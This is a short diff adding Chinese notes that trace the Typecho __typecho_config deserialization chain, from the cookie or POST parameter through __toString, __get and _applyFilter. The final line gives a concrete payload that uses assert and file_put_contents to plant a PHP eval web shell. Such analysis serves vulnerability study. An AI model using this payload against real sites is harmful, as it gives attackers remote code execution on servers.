@@ -1,0 +1,18 @@
+服务器接受COOKIE或者POST传递的__typecho_config参数
+进行base64解码 及反序列化 -》$config
+
+对参数$config['adapter'],$config['prefix'] 创建Typecho_Db对象
+
+创建对象的时候，使用了字符串拼接$config['adapter'],调用了__toString方法
+
+
+调用to_String方法中时候调用了$item['author']->screenName的__get方法
+
+__get方法返回的是对象的get($screenName（属性）)方法
+
+get方法中又调用的_applyFilter($screenName);方法
+
+
+此方法中对所有filter数组中的函数 对接收的value进行函数的执行
+
+最后的结果为  assert("file_put_contents('shell.php', '<?php @eval($_POST[l]);?>')")
